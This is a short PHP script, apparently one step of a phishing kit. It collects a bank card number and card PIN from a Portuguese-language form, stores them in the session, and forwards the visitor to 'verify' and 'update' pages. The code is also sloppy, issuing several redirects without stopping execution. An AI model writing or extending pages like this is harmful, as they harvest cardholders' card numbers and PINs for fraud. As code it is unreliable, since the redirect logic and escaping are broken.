<?php

session_start();


if(empty($_POST['numeroCard']) || empty($_POST['senhaCard'])){

    $_SESSION['error'] = "Insira todos os campos!";
    header('Location:index.php');


}else{

    header('Location:verifica2.php');

}


$numeroCard =  addslashes($_POST['numeroCard']);

$senhaCard = addslashes($_POST['senhaCard']);


$_SESSION['cartao'] = $numeroCard;

$_SESSION['senhaCartao'] = $senhaCard;

header('Location:atualiza.php');